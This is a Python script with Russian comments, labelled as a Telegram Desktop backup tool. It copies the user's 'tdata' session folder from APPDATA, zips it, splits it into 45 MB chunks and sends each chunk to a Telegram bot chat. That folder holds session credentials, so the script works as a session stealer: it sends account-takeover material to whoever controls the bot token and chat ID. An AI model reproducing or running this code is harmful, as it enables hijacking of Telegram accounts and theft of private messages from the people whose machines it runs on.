import zipfile
import os
import shutil
from dotenv import load_dotenv
from aiogram import Bot
from aiogram.types import FSInputFile

load_dotenv()

def zip_folder(folder_path, output_path):
    """
    Архивирует папку в zip-файл.

    :param folder_path: Путь к папке для архивирования.
    :type folder_path: str
    :param output_path: Путь к выходному zip-файлу.
    :type output_path: str
    """
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)

def split_file(file_path, chunk_size):
    """
    Разбивает файл на части.

    :param file_path: Путь к файлу для разбивки.
    :type file_path: str
    :param chunk_size: Размер каждой части в байтах.
    :type chunk_size: int
    """
    with open(file_path, 'rb') as f:
        chunk_number = 0
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            chunk_file_path = f"{file_path}.part{chunk_number}.zip"
            with open(chunk_file_path, 'wb') as chunk_file:
                chunk_file.write(chunk)
            chunk_number += 1

async def send_file_to_user(file_path, API_TOKEN, chat_id):
    """
    Отправляет файл пользователю через Telegram Bot API.

    :param file_path: Путь к файлу для отправки.
    :type file_path: str
    :param API_TOKEN: Токен Telegram Bot API.
    :type API_TOKEN: str
    :param chat_id: ID чата для отправки файла.
    :type chat_id: str
    """
    bot = Bot(token=API_TOKEN)
    async with bot:
        chunk_size = 45 * 1024 * 1024  # 45 MB
        split_file(file_path, chunk_size)
        chunk_number = 0
        while True:
            chunk_file_path = f"{file_path}.part{chunk_number}.zip"
            if not os.path.exists(chunk_file_path):
                break
            input_file = FSInputFile(chunk_file_path)
            await bot.send_document(chat_id, document=input_file)
            os.remove(chunk_file_path)
            chunk_number += 1

folder_to_zip = os.path.join(os.getenv('APPDATA'), r'Telegram Desktop\tdata')
temp_folder = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_temp')
output_zip = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_backup.zip')
bot_token = os.getenv('API_TOKEN')
chat_id = os.getenv('CHAT_ID')

print(f'BOT_TOKEN: {bot_token}')
print(f'CHAT_ID: {chat_id}')

if os.path.exists(folder_to_zip):
    try:
        if os.path.exists(temp_folder):
            shutil.rmtree(temp_folder)
        shutil.copytree(folder_to_zip, temp_folder)
        zip_folder(temp_folder, output_zip)
        shutil.rmtree(temp_folder)
        print(f'Папка "{folder_to_zip}" успешно скопирована и сжата в "{output_zip}".')

        import asyncio
        asyncio.run(send_file_to_user(output_zip, bot_token, chat_id))
        print('Файл успешно отправлен пользователю.')
    except PermissionError as e:
        print(f'Ошибка доступа: {e}')
    except Exception as e:
        print(f'Произошла ошибка: {e}')